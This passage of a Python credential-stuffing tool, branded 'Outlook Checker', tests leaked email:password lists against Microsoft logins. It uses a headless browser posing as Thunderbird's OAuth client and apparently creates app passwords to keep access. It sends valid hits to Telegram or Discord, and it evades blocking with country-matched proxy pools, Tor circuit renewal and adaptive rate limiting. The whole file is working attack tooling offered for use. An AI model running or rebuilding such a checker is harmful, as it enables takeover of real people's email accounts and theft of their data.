                    r'(?:error|warning|alert)[^>]*>\s*([^<]+)', create_html, re.IGNORECASE)
                if error_match:
                    result['error'] = f'Creation failed: {error_match.group(1).strip()}'
                else:
                    result['error'] = 'App password created but could not be extracted from response'
        except httpx.RequestError as e:
            result['error'] = f'Failed to create app password: {e}'
    except httpx.TimeoutException:
        result['error'] = 'Request timed out'
    except httpx.RequestError as e:
        result['error'] = f'Network error: {e}'
    except Exception as e:
        result['error'] = f'Unexpected error: {e}'
    finally:
        if session:
            session.close()
    return result


def _extract_form_tokens(html):
    tokens = {}
    for match in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*>', html, re.IGNORECASE):
        tag = match.group(0)
        name_match = re.search(r'name=["\']([^"\']+)["\']', tag)
        value_match = re.search(r'value=["\']([^"\']*)["\']', tag)
        if name_match:
            tokens[name_match.group(1)] = value_match.group(
                1) if value_match else ''
    canary_match = re.search(r'"canary"\s*:\s*"([^"]+)"', html)
    if canary_match and 'canary' not in tokens:
        tokens['canary'] = canary_match.group(1)
    flow_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
    if flow_match:
        tokens['flowtoken'] = flow_match.group(1)
    return tokens


def _extract_app_password(html):
    pw_match = re.search(
        r'<[^>]*(?:class|id)=["\'][^"\']*(?:app-?password|generated|password-display)[^"\']*["\'][^>]*>\s*([a-z]{4}\s+[a-z]{4}\s+[a-z]{4}\s+[a-z]{4})\s*<', html, re.IGNORECASE)
    if pw_match:
        return pw_match.group(1).strip()
    pw_match = re.search(
        r'(?:password|generated|apppassword)\s*["\']?\s*[:=]\s*["\']?([a-z]{16})["\']?', html, re.IGNORECASE)
    if pw_match:
        return pw_match.group(1).strip()
    pw_match = re.search(r'>([a-z]{4}\s[a-z]{4}\s[a-z]{4}\s[a-z]{4})<', html)
    if pw_match:
        return pw_match.group(1).strip()
    pw_match = re.search(
        r'<input[^>]*value=["\']([a-z]{4}\s?[a-z]{4}\s?[a-z]{4}\s?[a-z]{4})["\'][^>]*>', html, re.IGNORECASE)
    if pw_match:
        return pw_match.group(1).strip()
    pw_match = re.search(
        r'<(?:span|div|p|code|strong|b|input)[^>]*>\s*([a-z]{16})\s*</', html)
    if pw_match:
        return pw_match.group(1).strip()
    return None


# ---- browser_check.py (playwright fallback) ----
async def check_with_browser(email, password):
    account = f"{email}:{password}"
    if not HAS_PLAYWRIGHT:
        return account, "failed"
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            )
            page = await context.new_page()
            page.set_default_timeout(30000)
            try:
                login_url = (
                    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
                    '?client_id=e6f8716e-299d-4ed9-bbf3-453f192f44e5'
                    '&response_type=code'
                    '&scope=https://outlook.office.com/IMAP.AccessAsUser.All'
                    '&redirect_uri=msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D'
                )
                await page.goto(login_url, wait_until='networkidle')
                email_input = page.locator(
                    'input[type="email"], input[name="loginfmt"]')
                await email_input.fill(email)
                await page.locator('input[type="submit"], #idSIButton9').click()
                await page.wait_for_load_state('networkidle')
                await asyncio.sleep(1)
                page_content = await page.content()
                if "doesn't exist" in page_content or "that username" in page_content.lower():
                    return account, 'not_exist'
                password_input = page.locator(
                    'input[type="password"], input[name="passwd"]')
                await password_input.fill(password)
                await page.locator('input[type="submit"], #idSIButton9').click()
                await page.wait_for_load_state('networkidle')
                await asyncio.sleep(2)
                final_url = page.url
                page_content = await page.content()
                if '?code=' in final_url:
                    return account, 'valid'
                elif 'proofs' in page_content:
                    return account, '2fa'
                elif 'Consent/Update' in page_content:
                    return account, 'consent'
                elif 'ar/cancel' in page_content:
                    return account, 'pending_security'
                elif 'Abuse?' in page_content:
                    return account, 'locked'
                elif 'recover?' in page_content:
                    return account, 'recovery'
                elif 'incorrect' in page_content.lower():
                    return account, 'password'
                else:
                    return account, 'invalid'
            finally:
                await browser.close()
    except Exception:
        return account, 'failed'


# ============================================================================
# CLASSES
# ============================================================================

# ---- Dashboard (rich terminal) ----
class Dashboard:
    def __init__(self, total_combos, get_counters_func, get_active_threads_func, target_threads):
        self.total_combos = total_combos
        self.get_counters = get_counters_func
        self.get_active_threads = get_active_threads_func
        self.target_threads = target_threads
        self.start_time = time.time()
        self.activity_log = deque(maxlen=12)
        self.log_lock = threading.Lock()
        self._running = False
        self._thread = None
        self._live = None
        self.rate_limit_warnings = 0

    def log_event(self, thread_id, status, account):
        timestamp = time.strftime("%H:%M:%S")
        if 'VALID' in status.upper():
            style = "bold green"
        elif '2FA' in status.upper():
            style = "bold cyan"
        elif 'CONSENT' in status.upper():
            style = "bold cyan"
        elif 'LOCKED' in status.upper() or 'RECOVERY' in status.upper():
            style = "yellow"
        elif 'RATE' in status.upper():
            style = "bold magenta"
            self.rate_limit_warnings += 1
        elif 'FAILED' in status.upper() or 'INVALID' in status.upper():
            style = "red"
        else:
            style = "white"
        from rich.text import Text
        entry = Text()
        entry.append(f"  {timestamp} ", style="dim")
        entry.append(f"T-{thread_id:02d} ", style="dim cyan")
        entry.append(f"{status:<24s} ", style=style)
        display_account = account if len(
            account) <= 45 else account[:42] + "..."
        entry.append(display_account, style="dim white")
        with self.log_lock:
            self.activity_log.append(entry)

    def _build_layout(self):
        from rich.table import Table
        from rich.panel import Panel
        from rich.text import Text
        from rich.console import Group
        from rich import box
        counters = self.get_counters()
        active_threads = self.get_active_threads()
        valid = counters.get('valid', 0)
        twofa = counters.get('2fa', 0)
        consent = counters.get('consent', 0)
        pending = counters.get('pending_security', 0)
        locked = counters.get('locked', 0)
        recovery = counters.get('recovery', 0)
        password = counters.get('password', 0)
        not_exist = counters.get('not_exist', 0)
        invalid = counters.get('invalid', 0)
        failed = counters.get('failed', 0)
        rate_limited = counters.get('rate_limited', 0)
        imap_valid = counters.get('imap_valid', 0)
        total_checked = sum(counters.values())
        total_valid = valid + twofa + consent + pending + imap_valid
        total_invalid = locked + recovery + password + not_exist + invalid
        remaining = self.total_combos - total_checked
        elapsed = time.time() - self.start_time
        speed = total_checked / elapsed if elapsed > 0 else 0
        eta_seconds = remaining / speed if speed > 0 else 0
        if eta_seconds > 3600:
            eta_str = f"{int(eta_seconds//3600)}h {int((eta_seconds % 3600)//60)}m"
        elif eta_seconds > 60:
            eta_str = f"{int(eta_seconds//60)}m {int(eta_seconds % 60)}s"
        else:
            eta_str = f"{int(eta_seconds)}s"
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        runtime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        pct = (total_checked / self.total_combos *
               100) if self.total_combos > 0 else 0
        header_text = Text()
        header_text.append("  OUTLOOK CHECKER", style="bold white")
        header_text.append("  ·  ", style="dim")
        header_text.append(f"Runtime {runtime_str}", style="cyan")
        header_text.append("  ·  ", style="dim")
        header_text.append(
            f"Threads {active_threads}/{self.target_threads}", style="yellow")
        header_text.append("  ·  ", style="dim")
        header_text.append(f"{speed:.1f} acc/s", style="green")
        header_text.append("  ·  ", style="dim")
        header_text.append(f"ETA {eta_str}", style="magenta")
        if self.rate_limit_warnings > 0:
            header_text.append("  ·  ", style="dim")
            header_text.append(
                f"⚠ {self.rate_limit_warnings} rate limits", style="bold red")
        bar_width = 40
        filled = int(bar_width * pct / 100)
        bar = "█" * filled + "░" * (bar_width - filled)
        progress_text = Text()
        progress_text.append(f"  [{bar}] ", style="green")
        progress_text.append(f"{pct:.1f}% ", style="bold white")
        progress_text.append(
            f"({total_checked:,}/{self.total_combos:,})", style="dim")
        stats_table = Table(box=box.SIMPLE_HEAVY, expand=True,
                            show_edge=False, pad_edge=False)
        stats_table.add_column("✅ Valid", justify="center", style="bold green")
        stats_table.add_column("🔐 2FA", justify="center", style="cyan")
        stats_table.add_column("📋 Consent", justify="center", style="cyan")
        stats_table.add_column("⏳ Pending", justify="center", style="green")
        stats_table.add_column("📧 IMAP", justify="center", style="bold cyan")
        stats_table.add_column("🔒 Locked", justify="center", style="yellow")
        stats_table.add_column("🔄 Recovery", justify="center", style="yellow")
        stats_table.add_column("❌ Wrong PW", justify="center", style="red")
        stats_table.add_column("👻 No Exist", justify="center", style="red")
        stats_table.add_column("⛔ Invalid", justify="center", style="red")
        stats_table.add_column("💀 Failed", justify="center", style="dim red")
        stats_table.add_row(
            str(valid), str(twofa), str(consent), str(
                pending), str(imap_valid),
            str(locked), str(recovery), str(password), str(not_exist),
            str(invalid), str(failed)
        )
        summary_text = Text()
        summary_text.append(f"  Total Valid: ", style="dim")
        summary_text.append(f"{total_valid:,}", style="bold green")
        summary_text.append(f"  │  Total Invalid: ", style="dim")
        summary_text.append(f"{total_invalid:,}", style="bold red")
        summary_text.append(f"  │  Failed: ", style="dim")
        summary_text.append(f"{failed:,}", style="dim red")
        summary_text.append(f"  │  Remaining: ", style="dim")
        summary_text.append(f"{remaining:,}", style="bold white")
        if rate_limited > 0:
            summary_text.append(f"  │  Rate Limited: ", style="dim")
            summary_text.append(f"{rate_limited:,}", style="bold magenta")
        with self.log_lock:
            log_entries = list(self.activity_log)
        if not log_entries:
            log_content = Text("  Waiting for results...", style="dim italic")
        else:
            log_content = Group(*log_entries)
        content = Group(
            header_text,
            Text(""),
            progress_text,
            Text(""),
            stats_table,
            summary_text,
            Text(""),
            Panel(log_content, title="[bold]Recent Activity[/bold]",
                  border_style="dim", padding=(0, 1)),
        )
        return Panel(
            content,
            title="[bold cyan]🚀 Outlook Checker by t.me/occursive[/bold cyan]",
            border_style="cyan",
            padding=(1, 2)
        )

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        from rich.live import Live
        try:
            with Live(self._build_layout(), refresh_per_second=2, screen=True) as live:
                self._live = live
                while self._running:
                    live.update(self._build_layout())
                    time.sleep(0.5)
        except Exception:
            pass

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        self._live = None


# ---- SessionManager ----
class SessionManager:
    def __init__(self, config):
        self.save_interval = config.get('session_save_interval', 50)
        self.processed_since_save = 0
        self._counters_snapshot = {}
        self._file_position = 0
        self._total_combos = 0
        self._resumed = False

    def check_existing_session(self):
        if not os.path.exists(SESSION_FILE):
            return False, 0
        try:
            with open(SESSION_FILE, 'r') as f:
                data = json.load(f)
            saved_time = data.get('timestamp', 'unknown')
            saved_checked = data.get('total_checked', 0)
            saved_total = data.get('total_combos', 0)
            print(f"\n{Fore.YELLOW}⏸  Previous session detected!{Style.RESET_ALL}")
            print(f"   Saved at: {Fore.CYAN}{saved_time}{Style.RESET_ALL}")
            print(
                f"   Progress: {Fore.GREEN}{saved_checked:,}{Style.RESET_ALL} / {Fore.WHITE}{saved_total:,}{Style.RESET_ALL} checked")
            print()
            try:
                choice = input(
                    f"{Fore.LIGHTBLUE_EX}  > Resume previous session? (Y/n): {Style.RESET_ALL}").strip().lower()
            except (EOFError, KeyboardInterrupt):
                return False, 0
            if choice in ('', 'y', 'yes'):
                self._counters_snapshot = data.get('counters', {})
                self._file_position = data.get('file_position', 0)
                self._total_combos = data.get('total_combos', 0)
                self._resumed = True
                print(
                    f"{Fore.GREEN}  ✓ Resuming from previous session...{Style.RESET_ALL}\n")
                return True, self._file_position
            else:
                self.delete_session()
                print(
                    f"{Fore.YELLOW}  ✓ Starting fresh session...{Style.RESET_ALL}\n")
                return False, 0
        except (json.JSONDecodeError, KeyError, Exception):
            self.delete_session()
            return False, 0

    def get_restored_counters(self):
        return self._counters_snapshot

    @property
    def resumed(self):
        return self._resumed

    def notify_processed(self, counters_func, file_position, total_combos):
        self.processed_since_save += 1
        if self.processed_since_save >= self.save_interval:
            self.save_session(counters_func(), file_position, total_combos)
            self.processed_since_save = 0

    def save_session(self, counters, file_position, total_combos):
        total_checked = sum(counters.values())
        data = {
            'counters': counters,
            'file_position': file_position,
            'total_combos': total_combos,
            'total_checked': total_checked,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        try:
            temp_file = SESSION_FILE + '.tmp'
            with open(temp_file, 'w') as f:
                json.dump(data, f, indent=2)
            os.replace(temp_file, SESSION_FILE)
        except Exception:
            pass

    def delete_session(self):
        try:
            if os.path.exists(SESSION_FILE):
                os.remove(SESSION_FILE)
        except Exception:
            pass

    def force_save(self, counters_func, file_position, total_combos):
        self.save_session(counters_func(), file_position, total_combos)


# ---- NotificationManager ----
class NotificationManager:
    DISCORD_COLOR_MAP = {
        'valid': 0x2ecc71,
        '2fa': 0x3498db,
        'consent': 0xe67e22,
        'pending_security': 0xf39c12,
        'imap_valid': 0x1abc9c,
    }
    DISCORD_TITLE_MAP = {
        'valid': '\u2705 Valid Hit',
        '2fa': '\U0001f510 2FA Account',
        'consent': '\U0001f4cb Consent Required',
        'pending_security': '\u23f3 Pending Security',
        'imap_valid': '\U0001f4e7 IMAP Valid',
    }

    def __init__(self, config):
        self.telegram_token = config.get('telegram_bot_token', '')
        self.telegram_chat_id = config.get('telegram_chat_id', '')
        self.discord_url = config.get('discord_webhook_url', '')
        self.enabled = bool(self.telegram_token and self.telegram_chat_id) or bool(
            self.discord_url)
        self._last_send = 0
        self._min_interval = 1.0
        self._discord_send_times = deque()
        self._discord_rate_lock = threading.Lock()
        self._discord_queue = deque()
        self._discord_flush_thread = None

    def notify_valid(self, account, reason):
        if not self.enabled:
            return
        now = time.time()
        if now - self._last_send < self._min_interval:
            return
        self._last_send = now
        emoji_map = {
            'valid': '\u2705',
            '2fa': '\ud83d\udd10',
            'consent': '\ud83d\udccb',
            'pending_security': '\u23f3',
            'imap_valid': '\ud83d\udce7'
        }
        emoji = emoji_map.get(reason, '\u2705')
        message = f"{emoji} Valid Hit!\n\nAccount: {account}\nType: {reason.upper()}\nTime: {time.strftime('%H:%M:%S')}"
        thread = threading.Thread(
            target=self._send_all,
            args=(message,),
            kwargs={'account': account, 'reason': reason},
            daemon=True
        )
        thread.start()

    def notify_summary(self, stats):
        if not self.enabled:
            return
        message = (
            "\ud83c\udfaf Checker Complete!\n\n"
            f"Total Checked: {stats.get('total_checked', 0):,}\n"
            f"Total Valid: {stats.get('total_valid', 0):,}\n"
            f"Total Invalid: {stats.get('total_invalid', 0):,}\n"
            f"Failed: {stats.get('failed', 0):,}\n"
            f"Runtime: {stats.get('runtime', 'N/A')}"
        )
        thread = threading.Thread(
            target=self._send_all,
            args=(message,),
            kwargs={'summary_stats': stats},
            daemon=True
        )
        thread.start()

    def _send_all(self, message, account=None, reason=None, summary_stats=None):
        if self.telegram_token and self.telegram_chat_id:
            self._send_telegram(message)
        if self.discord_url:
            if summary_stats:
                self._send_discord_summary(summary_stats)
            elif account and reason:
                self._send_discord_valid(account, reason)
            else:
                self._send_discord_embed(
                    {'title': 'Outlook Checker', 'description': message, 'color': 0x00ff00})

    def _send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            payload = {'chat_id': self.telegram_chat_id,
                       'text': message, 'parse_mode': 'HTML'}
            with httpx.Client(timeout=10) as client:
                client.post(url, json=payload)
        except Exception:
            pass

    def _can_send_discord(self):
        now = time.time()
        with self._discord_rate_lock:
            while self._discord_send_times and self._discord_send_times[0] < now - 60:
                self._discord_send_times.popleft()
            return len(self._discord_send_times) < 30

    def _record_discord_send(self):
        with self._discord_rate_lock:
            self._discord_send_times.append(time.time())

    def _send_discord_embed(self, embed):
        if self._can_send_discord():
            self._do_send_discord(embed)
        else:
            with self._discord_rate_lock:
                self._discord_queue.append(embed)
            self._ensure_flush_thread()

    def _do_send_discord(self, embed):
        try:
            payload = {'embeds': [embed]}
            with httpx.Client(timeout=10) as client:
                client.post(self.discord_url, json=payload)
            self._record_discord_send()
        except Exception:
            pass

    def _ensure_flush_thread(self):
        with self._discord_rate_lock:
            if self._discord_flush_thread and self._discord_flush_thread.is_alive():
                return
            self._discord_flush_thread = threading.Thread(
                target=self._flush_discord_queue, daemon=True
            )
            self._discord_flush_thread.start()

    def _flush_discord_queue(self):
        while True:
            with self._discord_rate_lock:
                if not self._discord_queue:
                    return
            if self._can_send_discord():
                with self._discord_rate_lock:
                    if self._discord_queue:
                        embed = self._discord_queue.popleft()
                    else:
                        return
                self._do_send_discord(embed)
            else:
                time.sleep(2)

    def _send_discord_valid(self, account, reason):
        now = datetime.now(timezone.utc)
        color = self.DISCORD_COLOR_MAP.get(reason, 0x2ecc71)
        title = self.DISCORD_TITLE_MAP.get(reason, '\u2705 Valid Hit')
        embed = {
            'color': color,
            'title': title,
            'description': account,
            'fields': [
                {'name': 'Status', 'value': reason, 'inline': True},
                {'name': 'Time', 'value': now.strftime(
                    '%H:%M:%S UTC'), 'inline': True}
            ],
            'footer': {'text': 'Outlook Checker \u2022 t.me/occursive'},
            'timestamp': now.isoformat()
        }
        self._send_discord_embed(embed)

    def _send_discord_summary(self, stats):
        now = datetime.now(timezone.utc)
        embed = {
            'color': 0x9b59b6,
            'title': '\U0001f4ca Check Complete',
            'fields': [
                {'name': 'Total Checked',
                    'value': f"{stats.get('total_checked', 0):,}", 'inline': True},
                {'name': 'Valid',
                    'value': f"{stats.get('total_valid', 0):,}", 'inline': True},
                {'name': 'Invalid',
                    'value': f"{stats.get('total_invalid', 0):,}", 'inline': True},
                {'name': 'Failed',
                    'value': f"{stats.get('failed', 0):,}", 'inline': True},
                {'name': 'Runtime', 'value': str(
                    stats.get('runtime', 'N/A')), 'inline': True}
            ],
            'footer': {'text': 'Outlook Checker \u2022 t.me/occursive'},
            'timestamp': now.isoformat()
        }
        self._send_discord_embed(embed)


# ---- SmartRateLimiter ----
class SmartRateLimiter:
    def __init__(self, base_delay=1.0, min_delay=0.1, max_delay=30.0, window_seconds=60):
        self._base_delay = base_delay
        self._min_delay = min_delay
        self._max_delay = max_delay
        self._window_seconds = window_seconds
        self._current_delay = base_delay
        self._history = deque()
        self._lock = threading.Lock()

    def report_success(self):
        with self._lock:
            self._history.append((time.time(), False))
            self._prune()

    def report_rate_limit(self):
        with self._lock:
            self._history.append((time.time(), True))
            self._prune()

    def get_delay(self):
        with self._lock:
            self._prune()
            total = len(self._history)
            if total == 0:
                return self._current_delay
            rate_limited = sum(1 for _, was_rl in self._history if was_rl)
            pct = (rate_limited / total) * 100.0
            if pct < 5.0:
                self._current_delay = max(
                    self._min_delay, self._current_delay * 0.90)
            elif pct > 15.0:
                self._current_delay = min(
                    self._max_delay, self._current_delay * 1.25)
            return self._current_delay

    def wait(self):
        delay = self.get_delay()
        jitter = delay * random.uniform(-0.20, 0.20)
        actual = max(0.0, delay + jitter)
        time.sleep(actual)

    def get_stats(self):
        with self._lock:
            self._prune()
            total = len(self._history)
            rate_limited = sum(1 for _, was_rl in self._history if was_rl)
            pct = (rate_limited / total * 100.0) if total else 0.0
            return {
                "current_delay": round(self._current_delay, 4),
                "rate_limit_pct": round(pct, 2),
                "total_requests": total,
                "window_size": self._window_seconds,
            }

    def _prune(self):
        cutoff = time.time() - self._window_seconds
        while self._history and self._history[0][0] < cutoff:
            self._history.popleft()


# ---- GeoProxyPool ----
class GeoProxyPool:
    def __init__(self, proxies, proxy_type="http", db=None):
        self._proxy_type = proxy_type
        self._db = db
        self._lock = threading.Lock()
        self._pool = {}
        for p in proxies:
            self._pool[p] = {"country": None, "alive": True}
        self._resolve_thread = threading.Thread(
            target=self._resolve_all_geo, daemon=True, name="GeoProxyResolver")
        self._resolve_thread.start()

    def _resolve_all_geo(self):
        with self._lock:
            addresses = list(self._pool.keys())
        for addr in addresses:
            country = get_proxy_country(addr)
            with self._lock:
                if addr in self._pool:
                    self._pool[addr]["country"] = country
            if self._db is not None and country is not None:
                try:
                    self._db.mark_proxy_alive(addr, country=country)
                except Exception:
                    pass
            time.sleep(1.5)

    def get_proxy(self, email=None):
        if email:
            hint = get_email_region_hint(email)
            if hint:
                match = self.get_proxy_by_country(hint)
                if match:
                    return match
        with self._lock:
            alive = [addr for addr, info in self._pool.items()
                     if info["alive"]]
        if not alive:
            return None
        return random.choice(alive)

    def get_proxy_by_country(self, country_code):
        country_code = country_code.upper()
        with self._lock:
            candidates = [
                addr
                for addr, info in self._pool.items()
                if info["alive"] and info.get("country") == country_code
            ]
        if not candidates:
            return None
        return random.choice(candidates)

    def add_proxy(self, proxy_str):
        with self._lock:
            if proxy_str in self._pool:
                return
            self._pool[proxy_str] = {"country": None, "alive": True}
        threading.Thread(
            target=self._resolve_single,
            args=(proxy_str,),
            daemon=True,
        ).start()
        if self._db is not None:
            try:
                self._db.insert_proxy(proxy_str, self._proxy_type)
            except Exception:
                pass

    def _resolve_single(self, proxy_str):
        country = get_proxy_country(proxy_str)
        with self._lock:
            if proxy_str in self._pool:
                self._pool[proxy_str]["country"] = country
        if self._db is not None and country is not None:
            try:
                self._db.mark_proxy_alive(proxy_str, country=country)
            except Exception:
                pass

    def remove_proxy(self, proxy_str):
        with self._lock:
            self._pool.pop(proxy_str, None)

    def get_geo_distribution(self):
        dist = {}
        with self._lock:
            for info in self._pool.values():
                key = info.get("country") or "unknown"
                dist[key] = dist.get(key, 0) + 1
        return dist

    def get_all_proxies(self):
        with self._lock:
            return [
                {
                    "address": addr,
                    "country": info.get("country"),
                    "alive": info["alive"],
                }
                for addr, info in self._pool.items()
            ]


def _extract_ip(proxy_str):
    ip_re = re.compile(
        r"(?:(?:[a-zA-Z0-9_.~%-]+:[a-zA-Z0-9_.~%-]+@)?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}))")
    match = ip_re.search(proxy_str)
    return match.group(1) if match else None


_TLD_COUNTRY_MAP = {
    ".de": "DE", ".fr": "FR", ".co.uk": "GB", ".uk": "GB",
    ".jp": "JP", ".br": "BR", ".in": "IN", ".it": "IT",
    ".es": "ES", ".nl": "NL", ".be": "BE", ".ru": "RU",
    ".pl": "PL", ".se": "SE", ".no": "NO", ".fi": "FI",
    ".dk": "DK", ".at": "AT", ".ch": "CH", ".pt": "PT",
    ".au": "AU", ".nz": "NZ", ".ca": "CA", ".mx": "MX",
    ".ar": "AR", ".cl": "CL", ".co": "CO", ".kr": "KR",
    ".cn": "CN", ".tw": "TW", ".hk": "HK", ".sg": "SG",
    ".my": "MY", ".th": "TH", ".ph": "PH", ".id": "ID",
    ".vn": "VN", ".za": "ZA", ".ng": "NG", ".ke": "KE",
    ".eg": "EG", ".tr": "TR", ".il": "IL", ".ae": "AE",
    ".sa": "SA", ".ie": "IE", ".cz": "CZ", ".sk": "SK",
    ".hu": "HU", ".ro": "RO", ".bg": "BG", ".hr": "HR",
    ".rs": "RS", ".ua": "UA", ".gr": "GR", ".lt": "LT",
    ".lv": "LV", ".ee": "EE",
}


GEO_CACHE = {}


def get_proxy_country(proxy_str):
    ip = _extract_ip(proxy_str)
    if ip is None:
        return None
    if ip in GEO_CACHE:
        return GEO_CACHE[ip]
    try:
        with httpx.Client(timeout=5) as client:
            resp = client.get(
                f"http://ip-api.com/json/{ip}?fields=status,countryCode")
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "success":
                    code = data.get("countryCode")
                    GEO_CACHE[ip] = code
                    return code
    except Exception:
        pass
    GEO_CACHE[ip] = None
    return None


def get_email_region_hint(email):
    email = email.lower().strip()
    at_idx = email.rfind("@")
    if at_idx == -1:
        return None
    domain = email[at_idx + 1:]
    for tld in sorted(_TLD_COUNTRY_MAP, key=len, reverse=True):
        if domain.endswith(tld):
            return _TLD_COUNTRY_MAP[tld]
    return None


# ---- TorManager ----
class TorManager:
    def __init__(self, socks_port=9050, control_port=9051, renew_interval=50):
        self.socks_port = socks_port
        self.control_port = control_port
        self.renew_interval = renew_interval
        self._request_count = 0
        self._lock = threading.Lock()
        self._tor_process = None
        self._available = False

    def is_tor_installed(self):
        try:
            result = subprocess.run(
                ['which', 'tor'], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False

    def is_tor_running(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', self.socks_port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def start(self):
        if self.is_tor_running():
            self._available = True
            return True
        if not self.is_tor_installed():
            return False
        try:
            self._tor_process = subprocess.Popen(
                ['tor', '--SocksPort', str(self.socks_port),
                 '--ControlPort', str(self.control_port),
                 '--HashedControlPassword', ''],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            for _ in range(30):
                if self.is_tor_running():
                    self._available = True
                    return True
                time.sleep(1)
        except Exception:
            pass
        return False

    def stop(self):
        if self._tor_process:
            try:
                self._tor_process.terminate()
                self._tor_process.wait(timeout=5)
            except Exception:
                try:
                    self._tor_process.kill()
                except Exception:
                    pass
            self._tor_process = None
        self._available = False

    def get_proxy_url(self):
        if not self._available:
            return None
        return f"socks5://127.0.0.1:{self.socks_port}"

    def renew_circuit(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(('127.0.0.1', self.control_port))
            sock.send(b'AUTHENTICATE ""\r\n')
            response = sock.recv(1024)
            if b'250' in response:
                sock.send(b'SIGNAL NEWNYM\r\n')
                response = sock.recv(1024)
                sock.close()
                if b'250' in response:
                    time.sleep(1)
                    return True
            sock.close()
        except Exception:
            pass
        return False

    def maybe_renew(self):
        with self._lock:
            self._request_count += 1
            if self._request_count >= self.renew_interval:
                self._request_count = 0
                self.renew_circuit()

    @property
    def available(self):
        return self._available


# ---- AnalyticsTracker ----
class AnalyticsTracker:
    def __init__(self, data_dir='data', interval=5):
        self.data_dir = data_dir
        self.interval = interval
        self.data_points = []
        self._lock = threading.Lock()
        self._running = False
        self._thread = None
        self._get_counters = None
        self._get_active_threads = None
        self._start_time = None
        self._total_combos = 0
        self._proxy_monitor = None
        os.makedirs(data_dir, exist_ok=True)

    def init(self, get_counters_func, get_active_threads_func, total_combos):
        self._get_counters = get_counters_func
        self._get_active_threads = get_active_threads_func
        self._total_combos = total_combos
        self._start_time = time.time()

    def set_proxy_monitor(self, monitor):
        self._proxy_monitor = monitor

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._record_loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        self.save()

    def _record_loop(self):
        while self._running:
            self._capture_point()
            time.sleep(self.interval)

    def _capture_point(self):
        if not self._get_counters:
            return
        counters = self._get_counters()
        active_threads = self._get_active_threads() if self._get_active_threads else 0
        elapsed = time.time() - self._start_time if self._start_time else 0
        total_checked = sum(counters.values())
        total_valid = (counters.get('valid', 0) + counters.get('2fa', 0) +
                       counters.get('consent', 0) + counters.get('pending_security', 0) +
                       counters.get('imap_valid', 0))
        total_invalid = (counters.get('locked', 0) + counters.get('recovery', 0) +
                         counters.get('password', 0) + counters.get('not_exist', 0) +
                         counters.get('invalid', 0))
        speed = total_checked / elapsed if elapsed > 0 else 0
        point = {
            'timestamp': time.time(),
            'elapsed': round(elapsed, 1),
            'elapsed_formatted': self._format_time(elapsed),
            'counters': counters,
            'total_checked': total_checked,
            'total_valid': total_valid,
            'total_invalid': total_invalid,
            'total_combos': self._total_combos,
            'speed': round(speed, 2),
            'active_threads': active_threads,
            'remaining': self._total_combos - total_checked
        }
        with self._lock:
            self.data_points.append(point)

    def _format_time(self, seconds):
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"

    def get_history(self):
        with self._lock:
            return list(self.data_points)

    def get_latest(self):
        with self._lock:
            return self.data_points[-1] if self.data_points else {}

    def get_cpm_history(self, window_minutes=60):
        cutoff = time.time() - (window_minutes * 60)
        with self._lock:
            points = [p for p in self.data_points if p['timestamp'] >= cutoff]
        result = []
        for i in range(1, len(points)):
            prev = points[i - 1]
            curr = points[i]
            time_delta = curr['timestamp'] - prev['timestamp']
            if time_delta <= 0:
                continue
            checked_delta = curr['total_checked'] - prev['total_checked']
            cpm = (checked_delta / time_delta) * 60
            result.append({
                'timestamp': curr['timestamp'],
                'cpm': round(cpm, 2),
                'checked_delta': checked_delta
            })
        return result

    def get_hit_rate_history(self, window_minutes=60):
        cutoff = time.time() - (window_minutes * 60)
        with self._lock:
            points = [p for p in self.data_points if p['timestamp'] >= cutoff]
        result = []
        for p in points:
            total = p['total_checked']
            valid = p['total_valid']
            rate = (valid / total * 100) if total > 0 else 0.0
            result.append({
                'timestamp': p['timestamp'],
                'hit_rate_pct': round(rate, 2),
                'valid_count': valid,
                'total_checked': total
            })
        return result

    def get_speed_history(self, window_minutes=60):
        cutoff = time.time() - (window_minutes * 60)
        with self._lock:
            points = [p for p in self.data_points if p['timestamp'] >= cutoff]
        result = []
        for i in range(1, len(points)):
            prev = points[i - 1]
            curr = points[i]
            time_delta = curr['timestamp'] - prev['timestamp']
            if time_delta <= 0:
                continue
            checked_delta = curr['total_checked'] - prev['total_checked']
            speed = checked_delta / time_delta
            result.append({
                'timestamp': curr['timestamp'],
                'speed': round(speed, 2)
            })
        return result

    def get_proxy_performance_summary(self):
        if self._proxy_monitor is None:
            return {}
        try:
            stats = self._proxy_monitor.get_stats()
            proxies = stats.get('proxies', [])
            if not proxies:
                return {
                    'total_proxies': stats.get('total', 0),
                    'alive': stats.get('alive', 0),
                    'dead': stats.get('dead', 0),
                    'avg_latency': stats.get('avg_latency', 0),
                    'fastest': 0,
                    'slowest': 0
                }
            latencies = [p.get('latency', 0)
                         for p in proxies if p.get('latency', 0) > 0]
